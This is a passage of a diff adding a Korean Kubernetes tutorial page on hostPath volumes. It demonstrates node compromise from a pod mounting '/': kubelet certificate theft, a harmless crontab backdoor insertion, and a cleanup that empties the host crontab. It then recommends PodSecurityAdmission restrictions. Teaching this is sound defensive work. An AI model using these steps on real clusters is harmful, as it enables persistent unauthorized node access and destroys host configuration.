+    <span class="s2">"name"</span>: <span class="s2">"super-secret"</span>,
+    <span class="s2">"namespace"</span>: <span class="s2">"default"</span>,
+    <span class="s2">"uid"</span>: <span class="s2">"32e0b174-abaf-477a-bf66-d1296d213704"</span>,
+    <span class="s2">"resourceVersion"</span>: <span class="s2">"30540"</span>,
+    <span class="s2">"creationTimestamp"</span>: <span class="s2">"2026-04-02T01:30:41Z"</span>,
+    ...
+</code></pre></div>  </div>
+
+</details>
+
+<p>kubelet 인증서를 탈취하면 <code class="highlighter-rouge">system:node</code> 권한으로 API 서버에 인증되고, 해당 노드의 Pod가 참조하는 Secret까지 API로 조회할 수 있다.</p>
+
+<h3 id="host-crontab에-백도어-삽입">host crontab에 백도어 삽입</h3>
+
+<p>호스트 파일시스템에 쓰기가 가능하면 노드에 영구적인 백도어를 심을 수 있다.</p>
+
+<details>
+  <summary>crontab 백도어 삽입 데모</summary>
+
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 호스트 쓰기 가능 여부 확인</span>
+kubectl <span class="nb">exec </span>node-explorer <span class="nt">--</span> sh <span class="nt">-c</span> <span class="s1">'
+touch /host/tmp/hostpath-write-test &amp;&amp; echo "WRITABLE" || echo "NOT WRITABLE"'</span>
+
+<span class="c"># 실행 결과</span>
+WRITABLE
+
+<span class="c"># crontab에 백도어 삽입 (무해한 데모)</span>
+kubectl <span class="nb">exec </span>node-explorer <span class="nt">--</span> sh <span class="nt">-c</span> <span class="s1">'
+echo "=== 기존 crontab ==="
+cat /host/etc/crontab
+echo ""
+echo "=== 백도어 크론 삽입 (무해한 데모) ==="
+echo "* * * * * root echo BACKDOOR_DEMO &gt;&gt; /tmp/pwned.log" &gt;&gt; /host/etc/crontab &amp;&amp; echo "CRONTAB MODIFIED!" || echo "CRONTAB WRITE FAILED"
+echo ""
+echo "=== 수정 후 crontab ==="
+cat /host/etc/crontab'</span>
+
+<span class="c"># 실행 결과</span>
+<span class="o">===</span> 기존 crontab <span class="o">===</span>
+
+<span class="o">===</span> 백도어 크론 삽입 <span class="o">(</span>무해한 데모<span class="o">)</span> <span class="o">===</span>
+CRONTAB MODIFIED!
+
+<span class="o">===</span> 수정 후 crontab <span class="o">===</span>
+<span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> root <span class="nb">echo </span>BACKDOOR_DEMO <span class="o">&gt;&gt;</span> /tmp/pwned.log
+
+<span class="c"># 정리</span>
+kubectl <span class="nb">exec </span>node-explorer <span class="nt">--</span> sh <span class="nt">-c</span> <span class="s1">'
+echo -n "" &gt; /host/etc/crontab
+rm -f /host/tmp/hostpath-write-test /host/tmp/pwned.log'</span>
+</code></pre></div>  </div>
+
+</details>
+
+<p>Pod가 삭제되어도 crontab에 삽입한 백도어는 노드에 남아 있다. <code class="highlighter-rouge">hostPath</code> 볼륨으로 노드 파일시스템에 쓰기가 가능하면, 이처럼 노드에 영구적인 백도어를 심을 수 있다.</p>
+
+<h2 id="hostpath-볼륨-타입-지정">hostPath 볼륨 타입 지정</h2>
+
+<p><code class="highlighter-rouge">hostPath</code> 볼륨에 <code class="highlighter-rouge">type</code>을 지정하여, 경로가 컨테이너 프로세스가 기대하는 형태(파일, 디렉터리 등)인지 확인할 수 있다. 지정 경로가 타입과 일치하지 않으면 Pod의 컨테이너가 실행되지 않는다.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>타입</th>
+      <th>설명</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>(빈 문자열)</td>
+      <td>볼륨 마운트 전 아무런 검사를 하지 않는다</td>
+    </tr>
+    <tr>
+      <td><code class="highlighter-rouge">Directory</code></td>
+      <td>지정 경로에 디렉터리가 존재하는지 확인한다. 기존 디렉터리를 마운트하고, 없으면 Pod 실행을 막고 싶을 때 사용한다</td>
+    </tr>
+    <tr>
+      <td><code class="highlighter-rouge">DirectoryOrCreate</code></td>
+      <td><code class="highlighter-rouge">Directory</code>와 동일하지만, 경로에 아무것도 없으면 빈 디렉터리를 생성한다</td>
+    </tr>
+    <tr>
+      <td><code class="highlighter-rouge">File</code></td>
+      <td>지정 경로가 파일이어야 한다</td>
+    </tr>
+    <tr>
+      <td><code class="highlighter-rouge">FileOrCreate</code></td>
+      <td><code class="highlighter-rouge">File</code>과 동일하지만, 경로에 아무것도 없으면 빈 파일을 생성한다</td>
+    </tr>
+    <tr>
+      <td><code class="highlighter-rouge">BlockDevice</code></td>
+      <td>지정 경로가 블록 디바이스여야 한다</td>
+    </tr>
+    <tr>
+      <td><code class="highlighter-rouge">CharDevice</code></td>
+      <td>지정 경로가 캐릭터 디바이스여야 한다</td>
+    </tr>
+    <tr>
+      <td><code class="highlighter-rouge">Socket</code></td>
+      <td>지정 경로가 UNIX 소켓이어야 한다</td>
+    </tr>
+  </tbody>
+</table>
+
+<blockquote>
+  <p><strong>Note:</strong> <code class="highlighter-rouge">FileOrCreate</code> 또는 <code class="highlighter-rouge">DirectoryOrCreate</code> 타입에서 Kubernetes가 파일/디렉터리를 생성할 때, 파일 권한은 각각 644(<code class="highlighter-rouge">rw-r--r--</code>)와 755(<code class="highlighter-rouge">rwxr-xr-x</code>)로 설정된다. 어느 경우든 kubelet을 실행하는 사용자 및 그룹이 소유자가 된다.</p>
+</blockquote>
+
+<p><br /></p>
+
+<h1 id="실무-관점-podsecurityadmission으로-hostpath-차단">실무 관점: PodSecurityAdmission으로 hostPath 차단</h1>
+
+<p>hostPath의 위험성을 인지했다면, 프로덕션 환경에서는 <strong>PodSecurityAdmission</strong>을 사용하여 hostPath 사용을 제한해야 한다. PodSecurityAdmission은 네임스페이스 레벨에서 Pod 보안 표준(Pod Security Standards)을 강제하는 내장 admission controller다.</p>
+
+<p>세 가지 프로파일이 있다.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>프로파일</th>
+      <th>hostPath 허용</th>
+      <th>대상</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>privileged</strong></td>
+      <td>O</td>
+      <td>시스템 데몬, 인프라 컴포넌트</td>
+    </tr>
+    <tr>
+      <td><strong>baseline</strong></td>
+      <td>O (제한적)</td>
+      <td>일반 워크로드의 기본 보안</td>
+    </tr>
+    <tr>
+      <td><strong>restricted</strong></td>
+      <td>X</td>
+      <td>보안이 중요한 워크로드</td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 네임스페이스에 restricted 프로파일 적용</span>
+kubectl label namespace my-app <span class="se">\</span>
+  pod-security.kubernetes.io/enforce<span class="o">=</span>restricted <span class="se">\</span>
+  pod-security.kubernetes.io/warn<span class="o">=</span>restricted
+
+<span class="c"># hostPath를 사용하는 Pod 생성 시도 → 차단됨</span>
+<span class="c"># Error: ... violates PodSecurity "restricted:latest": hostPath volumes ...</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">restricted</code> 프로파일이 적용된 네임스페이스에서는 hostPath 볼륨을 사용하는 Pod가 생성 자체가 거부된다. 시스템 레벨 Pod(kube-system 등)는 privileged로 유지하고, 일반 워크로드 네임스페이스에는 restricted를 적용하는 것이 권장 패턴이다.</p>
+
+<p><br /></p>
+
+<h1 id="정리">정리</h1>
+
+<ul>
+  <li><code class="highlighter-rouge">image</code> 볼륨은 OCI 이미지의 파일을 컨테이너를 실행하지 않고 직접 마운트하는 볼륨 타입이다. 기존의 init 컨테이너 + emptyDir 조합을 대체할 수 있으며, 이미지를 순수한 파일 패키징/배포 매체로 활용할 수 있게 한다</li>
+  <li><code class="highlighter-rouge">hostPath</code> 볼륨은 노드의 파일 시스템 경로를 Pod에 마운트한다. 시스템 레벨 Pod(로그 수집기, 모니터링 에이전트 등)에서 주로 사용되며, 일반 워크로드에서는 보안 위험 때문에 권장되지 않는다</li>
+  <li><code class="highlighter-rouge">hostPath: /</code>는 노드의 root 접근 권한과 동일하다. Secret 탈취, kubelet 인증서 도용, 노드 백도어 삽입 등의 공격이 가능하므로, PodSecurityAdmission의 <code class="highlighter-rouge">restricted</code> 프로파일로 사용을 반드시 제한해야 한다</li>
+</ul>
+
+<p><br /></p>
+
+        
+      </section>
+
+      
+
+<br>
+<div class="page__backlinks">
+  <h4 class="page__backlinks-title"><i class="fas fa-link" aria-hidden="true"></i> 이 글을 참조하는 글</h4>
+  <ul class="page__backlinks-list">
+    
+    <li><a href="/kubernetes/Kubernetes-Pod-Volume-01-Introduction/">[Kubernetes] Pod 볼륨 - 1. 볼륨 소개</a></li>
+    
+    <li><a href="/kubernetes/Kubernetes-Pod-Volume-05-PV-PVC-StorageClass/">[Kubernetes] Pod 볼륨 - 5. PersistentVolume, PersistentVolumeClaim, StorageClass</a></li>
+    
+    <li><a href="/kubernetes/Kubernetes-Pod-Volume-06-Static-Provisioning/">[Kubernetes] Pod 볼륨 - 6. 정적 프로비저닝과 노드 로컬 PersistentVolume</a></li>
+    
+    <li><a href="/kubernetes/Kubernetes-Pod-Volume-07-PV-Management-Ephemeral/">[Kubernetes] Pod 볼륨 - 7. PV 관리와 Ephemeral PersistentVolume</a></li>
+    
+    <li><a href="/kubernetes/Kubernetes-EKS-Auth-00-04-RBAC-Good-Practices/">[[EKS] EKS: 인증/인가 - 1. K8S 인증/인가 기초 - 3. RBAC 모범 사례</a></li>
+    
+  </ul>
+</div>
+
+
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> 태그: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#hostpath" class="page__taxonomy-item" rel="tag">hostPath</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#image-volume" class="page__taxonomy-item" rel="tag">image-volume</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#imagevolume" class="page__taxonomy-item" rel="tag">ImageVolume</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#kubernetes-in-action-2nd" class="page__taxonomy-item" rel="tag">Kubernetes-in-Action-2nd</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#kubernetes" class="page__taxonomy-item" rel="tag">Kubernetes</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#oci" class="page__taxonomy-item" rel="tag">OCI</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#security" class="page__taxonomy-item" rel="tag">security</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#volume" class="page__taxonomy-item" rel="tag">volume</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> 카테고리: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#kubernetes" class="page__taxonomy-item" rel="tag">Kubernetes</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> 업데이트:</strong> <time datetime="2026-04-05T00:00:00+09:00">April 5, 2026</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">공유하기</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=%5BKubernetes%5D+Pod+%EB%B3%BC%EB%A5%A8+-+3.+image+%EB%B3%BC%EB%A5%A8%EA%B3%BC+hostPath%20https%3A%2F%2Fsirzzang.github.io%2F%2Fkubernetes%2FKubernetes-Pod-Volume-03-Image-Volume-HostPath%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="공유하기 Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsirzzang.github.io%2F%2Fkubernetes%2FKubernetes-Pod-Volume-03-Image-Volume-HostPath%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="공유하기 Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fsirzzang.github.io%2F%2Fkubernetes%2FKubernetes-Pod-Volume-03-Image-Volume-HostPath%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="공유하기 LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+	  <br>
+	  <br>
+    
+    <img src="https://myhits.vercel.app/api/hit/https%3A%2F%2Fsirzzang.github.io%2Fkubernetes%2FKubernetes-Pod-Volume-03-Image-Volume-HostPath?color=green&label=hits&size=small" alt="hit count">
+      
+  <nav class="pagination">
+    
+      <a href="/kubernetes/Kubernetes-Pod-Volume-02-emptyDir/" class="pagination--pager" title="[Kubernetes] Pod 볼륨 - 2. emptyDir
+">이전</a>
+    
+    
+      <a href="/kubernetes/Kubernetes-Pod-Volume-04-ConfigMap-Secret-DownwardAPI-Projected/" class="pagination--pager" title="[Kubernetes] Pod 볼륨 - 4. configMap, secret, downwardAPI, projected 볼륨
+">다음</a>
+    
+  </nav>
+
+    </div>
+
+    
+      <div class="page__comments">
+  
+  
+      <h4 class="page__comments-title">댓글남기기</h4>
+      <section id="disqus_thread"></section>
+    
+</div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">참고</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src=
+          
+            "/assets/images/blog-AI.jpg"
+          
+          alt="">
+      </div>
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/ai/AI-LLM-Optimization-02-02-Transformer-Explainer-Overview/" rel="permalink">[Transformer] LLM 서빙과 최적화 - 2.2. Transformer Explainer 개요: GPT-2로 트랜스포머 내부 들여다보기
+</a>
+      
+    </h2>
+    <p class="page__meta">
+      
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i> 2026년 08월 05일
+        
+          <span class="page__meta-sep"> · </span>
+        
+      
+      
+        <i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  4 분 소요
+
+
+      
+    </p>
+    <p class="archive__item-excerpt" itemprop="description">브라우저에서 GPT-2가 다음 토큰을 만드는 과정을 직접 눌러 보고, 트랜스포머의 세 부분 — 임베딩, 트랜스포머 블록, 확률 — 을 큰 그림으로 잡아 보자.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src=
+          
+            "/assets/images/blog-AI.jpg"
+          
+          alt="">
+      </div>
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/ai/AI-LLM-Optimization-02-01-LLM-Transformer-Overview/" rel="permalink">[LLM] LLM 서빙과 최적화 - 2.1. LLM과 트랜스포머 개요: 언어 모델의 발전, LLM 서빙과 트랜스포머 아키텍처
+</a>
+      
+    </h2>
+    <p class="page__meta">
+      
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i> 2026년 08월 05일
+        
+          <span class="page__meta-sep"> · </span>
+        
+      
+      
+        <i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  11 분 소요
+
+
+      
+    </p>
+    <p class="archive__item-excerpt" itemprop="description">LLM 서빙을 이해하기 위한 LLM, 트랜스포머 아키텍처 개요에 대해 알아 보자.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src=
+          
+            "/assets/images/blog-AI.jpg"
+          
+          alt="">
+      </div>
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/ai/AI-LLM-Optimization-01-AI-Overview/" rel="permalink">[LLM] LLM 서빙과 최적화 - 1. AI 개요: 가중치, 행렬, 그리고 학습과 GPU
+</a>
+      
+    </h2>
+    <p class="page__meta">
+      
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i> 2026년 08월 05일
+        
+          <span class="page__meta-sep"> · </span>
+        
+      
+      
+        <i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  19 분 소요
+
+
+      
+    </p>
+    <p class="archive__item-excerpt" itemprop="description">가중치는 어떻게 학습되며, 그 숫자들이 모델의 판단 능력을 어떻게 결정하는지 알아보자.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src=
+          
+            "/assets/images/blog-AI.jpg"
+          
+          alt="">
+      </div>
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/ai/AI-Continual-Learning-Industrial-AI/" rel="permalink">[Continual Learning] 하나의 모델, 여러 개의 태스크: 산업 AI는 어떻게 새로운 지식을 계속 배우는가
+</a>
+      
+    </h2>
+    <p class="page__meta">
+      
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i> 2026년 07월 30일
+        
+          <span class="page__meta-sep"> · </span>
+        
+      
+      
+        <i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  18 분 소요
+
+
+      
+    </p>
+    <p class="archive__item-excerpt" itemprop="description">Superb AI 세미나에서 들은 연속 학습 방법론을 정리하고, MLOps 플랫폼 엔지니어가 배워야 할 점에 대해 생각해 보자.
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="검색어를 입력하세요..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- gads.sirzzang.com -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-1813896769045927"
+     data-ad-slot="4300544769"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>팔로우:</strong></li>
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> 피드</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2026 Eraser's StudyLog. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+  <script>
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-167501441-1']);
+  
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+
+
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "https://sirzzang.github.io//kubernetes/Kubernetes-Pod-Volume-03-Image-Volume-HostPath/";  /* Replace PAGE_URL with your page's canonical URL variable */
+      this.page.identifier = "/kubernetes/Kubernetes-Pod-Volume-03-Image-Volume-HostPath"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
+    };
+    (function() { /* DON'T EDIT BELOW THIS LINE */
+      var d = document, s = d.createElement('script');
+      s.src = 'https://sirzzang-github-io.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+
+
+
+
+  </body>
+</html>
